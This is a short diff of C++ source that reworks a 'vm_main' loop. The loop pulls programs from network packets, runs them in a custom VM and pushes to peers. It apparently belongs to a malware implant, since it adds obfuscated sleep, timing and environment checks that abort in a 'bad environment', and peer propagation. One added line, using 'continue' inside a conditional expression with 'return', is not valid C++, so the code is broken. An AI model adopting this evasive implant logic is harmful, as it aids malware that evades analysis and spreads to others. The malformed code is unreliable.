@@ -78,18 +78,27 @@ namespace vm {
 	namespace routines {
 
 		__function int64_t vm_main(void) {
-			vmcs_t vmcs = { };
-			vm_init(&vmcs); 
+			while(!m_halt){
+				vmcs_t vmcs = { };
 
-			while(!m_halt) { 
 				sleep_obf();  
+				if (!time_check()) {
+					continue;
+				}
+				if (!ctx->checkin && !ctx->queue) {
+					continue ? !env_check() : return (int64_t) vm_reason::bad_environment;
+				}
 				if (!read_program_from_packet(m_program)) { 
 					continue; 
 				}
+
+				vm_init(&vmcs); 
 				vm_entry(&vmcs); 
+				vm_finish(&vmcs);
+
+				push_peers();
 			};
 
-			vm_finish(&vmcs);
 			return (int64_t) m_reason;
 		}
 
